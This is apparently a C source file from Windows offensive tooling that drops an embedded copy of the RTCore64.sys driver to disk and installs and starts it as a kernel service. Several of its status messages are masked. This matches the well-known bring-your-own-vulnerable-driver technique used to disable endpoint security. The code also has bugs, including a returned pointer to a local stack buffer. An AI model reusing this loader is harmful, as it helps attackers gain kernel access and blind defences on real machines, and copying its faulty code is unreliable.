#include "Commun.h"
#include "driver.h"



BOOL install_driver_as_service(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    BOOL status = FALSE;
    SC_HANDLE hSCManager = NULL, hService = NULL;

    hSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSCManager) {
        hService = OpenService(hSCManager, serviceName, SERVICE_START);
        if (hService) {
            //wprintf(L"[+] \'%s\' service already registered\n\n", serviceName);
            wprintf(L"[+] \'*****\' service already registered\n\n");
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                wprintf(L"[*] \'%s\' service not present\n\n", serviceName);
                hService = CreateService(hSCManager, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL);
                if (hService) {
                    wprintf(L"[+] \'%s\' service successfully registered\n\n", serviceName);
                }
                else {
                    wprintf(L"[-] CreateService error: %u\n\n", GetLastError());
                }
            }
            else {
                wprintf(L"[-] OpenService error: %u\n\n", GetLastError());
            }
        }

        if (hService) {
            if (startIt) {
                if (status = StartService(hService, 0, NULL)) {
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                }
                else if (status == ERROR_SERVICE_ALREADY_RUNNING) {
                    //wprintf(L"[*] \'%s\' service already started\n", serviceName);
                    wprintf(L"[*] \'*****\' service already started\n");
                }
                else {
                   // wprintf(L"StartService error: %u\n", GetLastError());
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    else {
        wprintf(L"[-] OpenSCManager(create) error: %u\n", GetLastError());
        return GetLastError();
    }

    return 0;
}



wchar_t* DropRTCore64() {


    NTSTATUS status1;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK osb;
    UNICODE_STRING fileName;
    HANDLE fHandle;

    wchar_t current_directory[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, current_directory);
    wchar_t rtcore[MAX_PATH];
    ZeroMemory(rtcore, MAX_PATH);
    lstrcatW(rtcore, L"\\??\\");
    lstrcatW(rtcore, current_directory);
    lstrcatW(rtcore, L"\\RTCore64.sys");


    char current_dirStr[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, current_dirStr);
    char pathExit[MAX_PATH];
    ZeroMemory(pathExit, MAX_PATH);
    lstrcatA(pathExit, current_dirStr);
    lstrcatA(pathExit, "\\RTCore64.sys");

    FILE* file = fopen(pathExit, "r");

    if (file) {

        fclose(file);

        return rtcore;
    }
    else {





        RtlInitUnicodeString(&fileName, (PCWSTR)rtcore);
        ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
        InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status1 = NtCreateFile(&fHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, 0,
            FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

        if (!NT_SUCCESS(status1)) {
            printf("[!] Failed in CreateFile (%u)\n", GetLastError());
            return NULL;
        }

        NTSTATUS status2;
        IO_STATUS_BLOCK osb2;
        ZeroMemory(&osb2, sizeof(IO_STATUS_BLOCK));

        DWORD uSize = sizeof(driverRTCore);

        status2 = NtWriteFile(fHandle, NULL, NULL, NULL, &osb, (PVOID)driverRTCore, uSize, NULL, NULL);

        if (!NT_SUCCESS(status2)) {
            printf("[!] Failed in SysWriteFile (%u)\n", GetLastError());
            CloseHandle(fHandle);
            return NULL;
        }
        CloseHandle(fHandle);
        return rtcore;
    }
}





